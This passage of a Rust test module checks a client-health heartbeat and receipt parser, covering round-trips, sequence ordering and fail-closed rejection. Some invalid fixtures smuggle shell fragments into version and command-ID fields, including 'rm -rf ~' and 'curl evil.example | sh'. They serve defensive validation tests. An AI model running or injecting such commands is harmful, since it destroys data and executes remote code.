        "arch": "x64",
        "sentAt": "2026-09-03T17:05:00.000Z",
        "sequence": 97,
        "versions": { "desktop": "1.42.3", "cli": "5.106.2", "core": "3.18.0", "syncRunner": "5.106.2" },
        "syncState": "paused",
        "lastSyncAttemptAt": "2026-09-01T08:12:00.000Z",
        "lastSyncSuccessAt": "2026-09-01T08:12:00.000Z",
        "consecutiveFailures": 0,
        "conflictCount": 0,
        "updaterState": "up_to_date",
        "failureReason": "SYNC_PAUSED"
    }"#;

    const HEARTBEAT_CONFLICT_BLOCKED: &str = r#"{
        "contractVersion": 1,
        "installationId": "inst-77e3b19d5c02",
        "source": "desktop",
        "platform": "windows",
        "arch": "x64",
        "sentAt": "2026-09-03T17:05:00.000Z",
        "sequence": 233,
        "versions": { "desktop": "1.42.3", "cli": "5.106.2", "core": "3.18.0", "syncRunner": "5.106.2" },
        "syncState": "conflict_blocked",
        "lastSyncAttemptAt": "2026-09-03T16:55:00.000Z",
        "lastSyncSuccessAt": "2026-09-02T11:40:00.000Z",
        "consecutiveFailures": 2,
        "conflictCount": 3,
        "updaterState": "up_to_date",
        "failureReason": "CONFLICT_BLOCKED"
    }"#;

    const HEARTBEAT_DESKTOP_OUTDATED: &str = r#"{
        "contractVersion": 1,
        "installationId": "inst-c5d20a8891bb",
        "source": "desktop",
        "platform": "macos",
        "arch": "arm64",
        "sentAt": "2026-09-03T17:05:00.000Z",
        "sequence": 58,
        "versions": { "desktop": "1.30.0", "cli": "5.90.1", "core": "3.15.2", "syncRunner": "5.90.1" },
        "syncState": "idle",
        "lastSyncAttemptAt": "2026-09-03T17:00:00.000Z",
        "lastSyncSuccessAt": "2026-09-03T17:00:00.000Z",
        "consecutiveFailures": 0,
        "conflictCount": 0,
        "updaterState": "update_available",
        "failureReason": "DESKTOP_OUTDATED"
    }"#;

    const HEARTBEAT_AUTH_EXPIRED: &str = r#"{
        "contractVersion": 1,
        "installationId": "inst-e00f4b3a67cd",
        "source": "desktop",
        "platform": "linux",
        "arch": "x64",
        "sentAt": "2026-09-03T17:05:00.000Z",
        "sequence": 611,
        "versions": { "desktop": "1.42.3", "cli": "5.106.2", "core": "3.18.0", "syncRunner": "5.106.2" },
        "syncState": "error",
        "lastSyncAttemptAt": "2026-09-03T16:50:00.000Z",
        "lastSyncSuccessAt": "2026-08-30T22:04:00.000Z",
        "consecutiveFailures": 4,
        "conflictCount": 0,
        "updaterState": "up_to_date",
        "failureReason": "AUTH_EXPIRED"
    }"#;

    const HEARTBEAT_UPDATE_FAILED: &str = r#"{
        "contractVersion": 1,
        "installationId": "inst-1b6da9f04e55",
        "source": "desktop",
        "platform": "windows",
        "arch": "arm64",
        "sentAt": "2026-09-03T17:05:00.000Z",
        "sequence": 129,
        "versions": { "desktop": "1.41.0", "cli": "5.106.2", "core": "3.18.0", "syncRunner": "5.106.2" },
        "syncState": "idle",
        "lastSyncAttemptAt": "2026-09-03T17:00:00.000Z",
        "lastSyncSuccessAt": "2026-09-03T17:00:00.000Z",
        "consecutiveFailures": 0,
        "conflictCount": 0,
        "updaterState": "update_failed",
        "failureReason": "UPDATE_FAILED"
    }"#;

    const HEARTBEAT_RUNNER_FAILED: &str = r#"{
        "contractVersion": 1,
        "installationId": "inst-3fa8d2c96017",
        "source": "desktop",
        "platform": "macos",
        "arch": "arm64",
        "sentAt": "2026-09-03T17:05:00.000Z",
        "sequence": 302,
        "versions": { "desktop": "1.42.3", "cli": "5.106.2", "core": "3.18.0" },
        "syncState": "error",
        "lastSyncAttemptAt": "2026-09-03T16:58:00.000Z",
        "lastSyncSuccessAt": "2026-09-03T10:15:00.000Z",
        "consecutiveFailures": 3,
        "conflictCount": 0,
        "updaterState": "up_to_date",
        "failureReason": "RUNNER_FAILED"
    }"#;

    /// CLI-only + stale: exercises older-client tolerance — no desktop or
    /// syncRunner version, no updaterState (Absent ≠ "unchecked"), no
    /// conflictCount.
    const HEARTBEAT_STALE: &str = r#"{
        "contractVersion": 1,
        "installationId": "inst-88bc07e1d9a2",
        "source": "cli",
        "platform": "linux",
        "arch": "x64",
        "sentAt": "2026-08-20T09:30:00.000Z",
        "sequence": 17,
        "versions": { "cli": "5.101.0", "core": "3.17.4" },
        "syncState": "idle",
        "lastSyncAttemptAt": "2026-08-20T09:29:00.000Z",
        "lastSyncSuccessAt": "2026-08-20T09:29:00.000Z",
        "consecutiveFailures": 0,
        "failureReason": "HEARTBEAT_STALE"
    }"#;

    const RECEIPT_REPAIR_SUCCEEDED: &str = r#"{
        "contractVersion": 1,
        "commandId": "cmd-8c2f51ab90aa",
        "installationId": "inst-9a11c0de2f34",
        "kind": "RETRY_SYNC",
        "state": "succeeded",
        "revision": 3,
        "occurredAt": "2026-09-03T17:06:11.000Z"
    }"#;

    const RECEIPT_DIAGNOSTIC_SUCCEEDED: &str = r#"{
        "contractVersion": 1,
        "commandId": "cmd-01f7ee3b2c9d",
        "installationId": "inst-4f9d2c1a8b7e",
        "kind": "CHECK_NOW",
        "state": "succeeded",
        "revision": 1,
        "occurredAt": "2026-09-03T17:07:42.000Z",
        "checks": [
            { "check": "auth", "status": "pass" },
            { "check": "runner", "status": "pass" },
            { "check": "storage", "status": "fail", "reason": "DISK_FULL" }
        ]
    }"#;

    const RECEIPT_REPAIR_FAILED: &str = r#"{
        "contractVersion": 1,
        "commandId": "cmd-b3a90cd47e12",
        "installationId": "inst-1b6da9f04e55",
        "kind": "APPLY_DESKTOP_UPDATE",
        "state": "failed",
        "revision": 2,
        "occurredAt": "2026-09-03T17:09:03.000Z",
        "failureReason": "UPDATE_FAILED"
    }"#;

    // Canonical INVALID payloads — every adapter must REJECT every one of
    // these (fail closed). Each is the healthy/succeeded payload with one
    // poisoned value.

    const INVALID_HEARTBEAT_SHELL_TEXT: &str = r#"{
        "contractVersion": 1,
        "installationId": "inst-4f9d2c1a8b7e",
        "source": "desktop",
        "platform": "macos",
        "arch": "arm64",
        "sentAt": "2026-09-03T17:05:00.000Z",
        "sequence": 412,
        "versions": { "desktop": "1.42.3", "cli": "5.106.2; rm -rf ~", "core": "3.18.0", "syncRunner": "5.106.2" },
        "syncState": "idle",
        "lastSyncAttemptAt": "2026-09-03T17:00:00.000Z",
        "lastSyncSuccessAt": "2026-09-03T17:00:00.000Z",
        "consecutiveFailures": 0,
        "conflictCount": 0,
        "updaterState": "up_to_date"
    }"#;

    const INVALID_HEARTBEAT_CUSTOMER_PATH: &str = r#"{
        "contractVersion": 1,
        "installationId": "inst-4f9d2c1a8b7e",
        "source": "desktop",
        "platform": "macos",
        "arch": "arm64",
        "sentAt": "2026-09-03T17:05:00.000Z",
        "sequence": 412,
        "versions": { "desktop": "/Users/jane/Library/HQ", "cli": "5.106.2", "core": "3.18.0", "syncRunner": "5.106.2" },
        "syncState": "idle",
        "lastSyncAttemptAt": "2026-09-03T17:00:00.000Z",
        "lastSyncSuccessAt": "2026-09-03T17:00:00.000Z",
        "consecutiveFailures": 0,
        "conflictCount": 0,
        "updaterState": "up_to_date"
    }"#;

    const INVALID_HEARTBEAT_SECRET_TOKEN: &str = r#"{
        "contractVersion": 1,
        "installationId": "inst-4f9d2c1a8b7e",
        "source": "desktop",
        "platform": "macos",
        "arch": "arm64",
        "sentAt": "2026-09-03T17:05:00.000Z",
        "sequence": 412,
        "versions": { "desktop": "1.42.3", "cli": "eyJhbGciOiJIUzI1NiJ9", "core": "3.18.0", "syncRunner": "5.106.2" },
        "syncState": "idle",
        "lastSyncAttemptAt": "2026-09-03T17:00:00.000Z",
        "lastSyncSuccessAt": "2026-09-03T17:00:00.000Z",
        "consecutiveFailures": 0,
        "conflictCount": 0,
        "updaterState": "up_to_date"
    }"#;

    const INVALID_HEARTBEAT_RAW_LOGS: &str = r#"{
        "contractVersion": 1,
        "installationId": "inst-4f9d2c1a8b7e",
        "source": "desktop",
        "platform": "macos",
        "arch": "arm64",
        "sentAt": "2026-09-03T17:05:00.000Z",
        "sequence": 412,
        "versions": { "desktop": "1.42.3", "cli": "5.106.2", "core": "ERROR sync failed\n    at runner.ts:120", "syncRunner": "5.106.2" },
        "syncState": "idle",
        "lastSyncAttemptAt": "2026-09-03T17:00:00.000Z",
        "lastSyncSuccessAt": "2026-09-03T17:00:00.000Z",
        "consecutiveFailures": 0,
        "conflictCount": 0,
        "updaterState": "up_to_date"
    }"#;

    const INVALID_HEARTBEAT_UNKNOWN_FAILURE_REASON: &str = r#"{
        "contractVersion": 1,
        "installationId": "inst-4f9d2c1a8b7e",
        "source": "desktop",
        "platform": "macos",
        "arch": "arm64",
        "sentAt": "2026-09-03T17:05:00.000Z",
        "sequence": 412,
        "versions": { "desktop": "1.42.3", "cli": "5.106.2", "core": "3.18.0", "syncRunner": "5.106.2" },
        "syncState": "idle",
        "lastSyncAttemptAt": "2026-09-03T17:00:00.000Z",
        "lastSyncSuccessAt": "2026-09-03T17:00:00.000Z",
        "consecutiveFailures": 0,
        "conflictCount": 0,
        "updaterState": "up_to_date",
        "failureReason": "SOMETHING_ELSE"
    }"#;

    const INVALID_HEARTBEAT_UNKNOWN_SYNC_STATE: &str = r#"{
        "contractVersion": 1,
        "installationId": "inst-4f9d2c1a8b7e",
        "source": "desktop",
        "platform": "macos",
        "arch": "arm64",
        "sentAt": "2026-09-03T17:05:00.000Z",
        "sequence": 412,
        "versions": { "desktop": "1.42.3", "cli": "5.106.2", "core": "3.18.0", "syncRunner": "5.106.2" },
        "syncState": "force_synced",
        "lastSyncAttemptAt": "2026-09-03T17:00:00.000Z",
        "lastSyncSuccessAt": "2026-09-03T17:00:00.000Z",
        "consecutiveFailures": 0,
        "conflictCount": 0,
        "updaterState": "up_to_date"
    }"#;

    const INVALID_HEARTBEAT_NEGATIVE_SEQUENCE: &str = r#"{
        "contractVersion": 1,
        "installationId": "inst-4f9d2c1a8b7e",
        "source": "desktop",
        "platform": "macos",
        "arch": "arm64",
        "sentAt": "2026-09-03T17:05:00.000Z",
        "sequence": -1,
        "versions": { "desktop": "1.42.3", "cli": "5.106.2", "core": "3.18.0", "syncRunner": "5.106.2" },
        "syncState": "idle",
        "lastSyncAttemptAt": "2026-09-03T17:00:00.000Z",
        "lastSyncSuccessAt": "2026-09-03T17:00:00.000Z",
        "consecutiveFailures": 0,
        "conflictCount": 0,
        "updaterState": "up_to_date"
    }"#;

    const INVALID_RECEIPT_UNKNOWN_REPAIR_KIND: &str = r#"{
        "contractVersion": 1,
        "commandId": "cmd-8c2f51ab90aa",
        "installationId": "inst-9a11c0de2f34",
        "kind": "RUN_SHELL",
        "state": "succeeded",
        "revision": 3,
        "occurredAt": "2026-09-03T17:06:11.000Z"
    }"#;

    const INVALID_RECEIPT_SHELL_COMMAND_ID: &str = r#"{
        "contractVersion": 1,
        "commandId": "cmd-1; curl evil.example | sh",
        "installationId": "inst-9a11c0de2f34",
        "kind": "RETRY_SYNC",
        "state": "succeeded",
        "revision": 3,
        "occurredAt": "2026-09-03T17:06:11.000Z"
    }"#;

    const INVALID_RECEIPT_PROSE_CHECK_REASON: &str = r#"{
        "contractVersion": 1,
        "commandId": "cmd-01f7ee3b2c9d",
        "installationId": "inst-4f9d2c1a8b7e",
        "kind": "CHECK_NOW",
        "state": "succeeded",
        "revision": 1,
        "occurredAt": "2026-09-03T17:07:42.000Z",
        "checks": [{ "check": "storage", "status": "fail", "reason": "disk was full at /Users/jane" }]
    }"#;

    fn value(raw: &str) -> Value {
        serde_json::from_str(raw).expect("fixture must be valid JSON")
    }

    #[test]
    fn every_canonical_heartbeat_parses() {
        for (name, raw) in [
            ("healthy", HEARTBEAT_HEALTHY),
            ("paused", HEARTBEAT_PAUSED),
            ("conflictBlocked", HEARTBEAT_CONFLICT_BLOCKED),
            ("desktopOutdated", HEARTBEAT_DESKTOP_OUTDATED),
            ("authExpired", HEARTBEAT_AUTH_EXPIRED),
            ("updateFailed", HEARTBEAT_UPDATE_FAILED),
            ("runnerFailed", HEARTBEAT_RUNNER_FAILED),
            ("heartbeatStale", HEARTBEAT_STALE),
        ] {
            let parsed = parse_client_health_heartbeat(&value(raw));
            assert!(parsed.is_ok(), "canonical heartbeat {name} must parse: {parsed:?}");
        }
    }

    #[test]
    fn every_canonical_receipt_parses() {
        for (name, raw) in [
            ("repairSucceeded", RECEIPT_REPAIR_SUCCEEDED),
            ("diagnosticSucceeded", RECEIPT_DIAGNOSTIC_SUCCEEDED),
            ("repairFailed", RECEIPT_REPAIR_FAILED),
        ] {
            let parsed = parse_client_health_command_receipt(&value(raw));
            assert!(parsed.is_ok(), "canonical receipt {name} must parse: {parsed:?}");
        }
    }

    #[test]
    fn healthy_heartbeat_round_trips_byte_for_byte() {
        let input = value(HEARTBEAT_HEALTHY);
        let parsed = parse_client_health_heartbeat(&input).expect("healthy parses");
        let reserialized = serde_json::to_value(&parsed).expect("heartbeat serializes");
        assert_eq!(reserialized, input, "wire field names/values must survive round-trip");
    }

    #[test]
    fn diagnostic_receipt_round_trips_byte_for_byte() {
        let input = value(RECEIPT_DIAGNOSTIC_SUCCEEDED);
        let parsed = parse_client_health_command_receipt(&input).expect("receipt parses");
        let reserialized = serde_json::to_value(&parsed).expect("receipt serializes");
        assert_eq!(reserialized, input);
    }

    #[test]
    fn unchecked_vs_absent_updater_state_survives_the_wire() {
        // Absent: an older client that never reported the field.
        let stale = parse_client_health_heartbeat(&value(HEARTBEAT_STALE)).expect("stale parses");
        assert_eq!(stale.updater_state, None);
        let stale_wire = serde_json::to_value(&stale).expect("serializes");
        assert!(
            stale_wire.get("updaterState").is_none(),
            "absent updaterState must stay absent, not become \"unchecked\""
        );

        // Present "unchecked": the updater exists but has not run yet.
        let mut unchecked = value(HEARTBEAT_HEALTHY);
        unchecked["updaterState"] = json!("unchecked");
        let parsed = parse_client_health_heartbeat(&unchecked).expect("unchecked parses");
        assert_eq!(parsed.updater_state, Some(ClientHealthUpdaterState::Unchecked));
        let wire = serde_json::to_value(&parsed).expect("serializes");
        assert_eq!(wire.get("updaterState"), Some(&json!("unchecked")));
    }

    #[test]
    fn unknown_extra_fields_are_ignored_additive_tolerance() {
        let mut heartbeat = value(HEARTBEAT_HEALTHY);
        heartbeat["someFutureField"] = json!("value-from-a-newer-client");
        heartbeat["versions"]["futureRunner"] = json!("9.0.0");
        parse_client_health_heartbeat(&heartbeat).expect("extra heartbeat fields are tolerated");

        let mut receipt = value(RECEIPT_REPAIR_SUCCEEDED);
        receipt["someFutureField"] = json!(42);
        parse_client_health_command_receipt(&receipt).expect("extra receipt fields are tolerated");
    }

    #[test]
    fn every_invalid_heartbeat_fails_closed() {
        for (name, raw, code) in [
            (
                "shellText",
                INVALID_HEARTBEAT_SHELL_TEXT,
                ClientHealthContractErrorCode::UnsafeValue,
            ),
            (
                "customerPath",
                INVALID_HEARTBEAT_CUSTOMER_PATH,
                ClientHealthContractErrorCode::UnsafeValue,
            ),
            (
                "secretToken",
                INVALID_HEARTBEAT_SECRET_TOKEN,
                ClientHealthContractErrorCode::UnsafeValue,
            ),
            (
                "rawLogs",
                INVALID_HEARTBEAT_RAW_LOGS,
                ClientHealthContractErrorCode::UnsafeValue,
            ),
            (
                "unknownFailureReason",
                INVALID_HEARTBEAT_UNKNOWN_FAILURE_REASON,
                ClientHealthContractErrorCode::UnknownEnumValue,
            ),
            (
                "unknownSyncState",
                INVALID_HEARTBEAT_UNKNOWN_SYNC_STATE,
                ClientHealthContractErrorCode::UnknownEnumValue,
            ),
            (
                "negativeSequence",
                INVALID_HEARTBEAT_NEGATIVE_SEQUENCE,
                ClientHealthContractErrorCode::OutOfBounds,
            ),
        ] {
            let error = parse_client_health_heartbeat(&value(raw))
                .expect_err(&format!("invalid heartbeat {name} must be rejected"));
            assert_eq!(error.code, code, "unexpected code for invalid heartbeat {name}");
        }
    }

    #[test]
    fn every_invalid_receipt_fails_closed() {
        for (name, raw, code) in [
            (
                "unknownRepairKind",
                INVALID_RECEIPT_UNKNOWN_REPAIR_KIND,
                ClientHealthContractErrorCode::UnknownEnumValue,
            ),
            (
                "shellCommandId",
                INVALID_RECEIPT_SHELL_COMMAND_ID,
                ClientHealthContractErrorCode::UnsafeValue,
            ),
            (
                "proseCheckReason",
                INVALID_RECEIPT_PROSE_CHECK_REASON,
                ClientHealthContractErrorCode::UnsafeValue,
            ),
        ] {
            let error = parse_client_health_command_receipt(&value(raw))
                .expect_err(&format!("invalid receipt {name} must be rejected"));
            assert_eq!(error.code, code, "unexpected code for invalid receipt {name}");
        }
    }

    #[test]
    fn contract_errors_never_echo_the_offending_value() {
        let error = parse_client_health_heartbeat(&value(INVALID_HEARTBEAT_SHELL_TEXT))
            .expect_err("shell text must be rejected");
        let rendered = error.to_string();
        assert!(
            !rendered.contains("rm -rf"),
            "error rendering must not echo the poisoned value: {rendered}"
        );
        assert_eq!(error.field, "versions.cli");
    }

    #[test]
    fn sequence_discipline_drops_older_and_replayed_heartbeats() {
        // Shared cross-repo scenario: healthy at 413 (idle) then a late 412
        // (error) — after the newer sequence is applied, the older one must be
        // dropped and the snapshot must remain unchanged.
        let mut newer = value(HEARTBEAT_HEALTHY);
        newer["sequence"] = json!(413);
        newer["syncState"] = json!("idle");
        let mut older = value(HEARTBEAT_HEALTHY);
        older["sequence"] = json!(412);
        older["syncState"] = json!("error");
        let newer = parse_client_health_heartbeat(&newer).expect("newer parses");
        let older = parse_client_health_heartbeat(&older).expect("older parses");

        // Nothing stored yet: any sequence applies.
        assert!(should_apply_heartbeat(None, older.sequence));
        // Newer sequence replaces the stored snapshot.
        assert!(should_apply_heartbeat(Some(older.sequence), newer.sequence));
        // The late/replayed older sequence is dropped.
        assert!(!should_apply_heartbeat(Some(newer.sequence), older.sequence));
        // Equal sequence is a replay: dropped.
        assert!(!should_apply_heartbeat(Some(newer.sequence), newer.sequence));
    }

    // ── US-009/US-010 repair-intent contract additions ──────────────────────

    /// RESUME_SYNC receipt carrying a verified postcondition (versions +
    /// observed sync state) — the proving-outcome object US-010 attaches.
    const RECEIPT_RESUME_SYNC_POSTCONDITION: &str = r#"{
        "contractVersion": 1,
        "commandId": "cmd-7d3e91af22bc",
        "installationId": "inst-9a11c0de2f34",
        "kind": "RESUME_SYNC",
        "state": "succeeded",
        "revision": 3,
        "occurredAt": "2026-09-05T12:00:00.000Z",
        "postcondition": {
            "verified": true,
            "versions": { "cli": "5.106.2", "core": "3.18.0" },
            "syncState": "idle"
        }
    }"#;

    /// APPLY_DESKTOP_UPDATE on an unsupported Windows build: nothing installed,
    /// closed manual-action-required outcome paired with the new failure reason.
    const RECEIPT_MANUAL_ACTION_REQUIRED: &str = r#"{
        "contractVersion": 1,
        "commandId": "cmd-aa02bd7714ef",
        "installationId": "inst-77e3b19d5c02",
        "kind": "APPLY_DESKTOP_UPDATE",
        "state": "failed",
        "revision": 2,
        "occurredAt": "2026-09-05T12:01:00.000Z",
        "failureReason": "MANUAL_ACTION_REQUIRED",
        "manualActionRequired": true
    }"#;

    #[test]
    fn canceled_is_a_recognized_terminal_state() {
        // A server-only terminal state (US-009). It must parse rather than
        // fail closed if it ever appears in an incoming projection.
        let mut receipt = value(RECEIPT_REPAIR_SUCCEEDED);
        receipt["state"] = json!("canceled");
        let parsed = parse_client_health_command_receipt(&receipt).expect("canceled parses");
        assert_eq!(parsed.state, ClientHealthCommandState::Canceled);
        assert_eq!(
            serde_json::to_value(&parsed).unwrap()["state"],
            json!("canceled")
        );
    }

    #[test]
    fn confirmation_levels_round_trip() {
        assert_eq!(ClientHealthConfirmationLevel::None.wire_value(), "none");
        assert_eq!(
            ClientHealthConfirmationLevel::Consequence.wire_value(),
            "consequence"
        );
        assert_eq!(
            serde_json::to_value(ClientHealthConfirmationLevel::Consequence).unwrap(),
            json!("consequence")
        );
    }

    #[test]
    fn repair_args_parse_and_fail_closed() {
        // Empty object → no targetVersion.
        let empty = parse_client_health_repair_args("args", &json!({})).expect("empty args parse");
        assert_eq!(empty.target_version, None);

        // A valid SemVer targetVersion is accepted (reserved-but-parsed).
        let ok = parse_client_health_repair_args("args", &json!({ "targetVersion": "5.106.2" }))
            .expect("valid targetVersion parses");
        assert_eq!(ok.target_version.as_deref(), Some("5.106.2"));

        // An unknown key (e.g. a conflict-resolution choice) fails closed.
        let unknown = parse_client_health_repair_args("args", &json!({ "resolve": "local" }))
            .expect_err("unknown arg must be rejected");
        assert_eq!(unknown.code, ClientHealthContractErrorCode::UnknownEnumValue);

        // A shell fragment smuggled as a version fails the SemVer gate.
        let poisoned =
            parse_client_health_repair_args("args", &json!({ "targetVersion": "5; rm -rf ~" }))
                .expect_err("non-semver targetVersion must be rejected");
        assert_eq!(poisoned.code, ClientHealthContractErrorCode::UnsafeValue);
    }

    #[test]
    fn receipt_postcondition_round_trips_and_scrubs() {
        let input = value(RECEIPT_RESUME_SYNC_POSTCONDITION);
        let parsed = parse_client_health_command_receipt(&input).expect("postcondition parses");
        let post = parsed.postcondition.as_ref().expect("has postcondition");
        assert!(post.verified);
        assert_eq!(post.sync_state, Some(ClientHealthSyncState::Idle));
        assert_eq!(post.versions.as_ref().and_then(|v| v.core.as_deref()), Some("3.18.0"));
        // Byte-for-byte survival of the closed proof object.
        assert_eq!(serde_json::to_value(&parsed).unwrap(), input);

        // A customer path smuggled into a postcondition version fails closed —
        // no path/log can ride into a receipt's proof object.
        let mut poisoned = input.clone();
        poisoned["postcondition"]["versions"]["core"] = json!("/Users/jane/Library/HQ");
        let err = parse_client_health_command_receipt(&poisoned)
            .expect_err("path-shaped version must be rejected");
        assert_eq!(err.code, ClientHealthContractErrorCode::UnsafeValue);
        assert!(!err.to_string().contains("/Users/jane"));
    }

    #[test]
    fn manual_action_required_receipt_parses_with_closed_reason() {
        let parsed = parse_client_health_command_receipt(&value(RECEIPT_MANUAL_ACTION_REQUIRED))
            .expect("manual-action receipt parses");
        assert_eq!(parsed.manual_action_required, Some(true));
        assert_eq!(
            parsed.failure_reason,
            Some(ClientHealthFailureReason::ManualActionRequired)
        );
        assert_eq!(
            serde_json::to_value(&parsed).unwrap(),
            value(RECEIPT_MANUAL_ACTION_REQUIRED)
        );
    }

    #[test]
    fn non_boolean_manual_action_required_fails_closed() {
        let mut receipt = value(RECEIPT_MANUAL_ACTION_REQUIRED);
        receipt["manualActionRequired"] = json!("yes");
        let err = parse_client_health_command_receipt(&receipt)
            .expect_err("string manualActionRequired must be rejected");
        assert_eq!(err.code, ClientHealthContractErrorCode::InvalidType);
    }
}
